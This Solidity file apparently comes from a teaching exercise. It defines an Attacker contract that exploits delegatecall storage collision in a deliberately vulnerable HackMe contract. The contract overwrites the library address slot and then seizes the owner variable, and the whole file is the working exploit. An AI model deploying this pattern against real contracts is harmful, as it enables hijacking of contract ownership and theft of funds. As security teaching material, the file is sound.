pragma solidity ^0.8.19;
// SPDX-License-Identifier: UNLICENSED
import "./HackMe.sol";


contract Attacker {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(address _hackMe) {
        hackMe = HackMe(_hackMe);
    }
    event track(string name, address from);

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
        emit track("Attacker.doSomething", msg.sender);
    }
}